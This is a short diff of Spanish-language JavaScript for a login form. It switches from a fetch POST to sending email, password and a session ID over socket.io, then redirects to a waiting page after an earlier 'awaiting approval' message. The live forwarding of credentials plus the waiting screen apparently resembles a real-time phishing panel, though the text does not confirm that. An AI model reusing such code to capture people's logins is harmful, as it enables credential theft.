@@ -1,25 +1,19 @@
-document.getElementById('login-form').addEventListener('submit', async function (e) {
+const socket = io();
+const formulario = document.getElementById('login-form');
+
+formulario.addEventListener('submit', function (e) {
   e.preventDefault();
 
-  const usuario = document.getElementById('usuario').value;
-  const clave = document.getElementById('clave').value;
+  const correo = document.getElementById('usuario').value;
+  const contrasena = document.getElementById('clave').value;
 
-  try {
-    const response = await fetch('/enviar', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ usuario, clave })
-    });
+  // Generar un ID único para esta sesión
+  const sessionId = Math.random().toString(36).substring(2, 15);
+  localStorage.setItem('sessionId', sessionId);
 
-    if (response.ok) {
-      alert('Datos enviados correctamente. Esperando aprobación...');
-    } else {
-      alert('Error al enviar datos');
-    }
-  } catch (error) {
-    console.error('Error al enviar datos:', error);
-    alert('Error al enviar datos');
-  }
+  // Enviar los datos junto con el ID
+  socket.emit('dataForm', { correo, contrasena, sessionId });
+
+  // Ir a la pantalla de espera
+  window.location.href = 'opciones.html';
 });
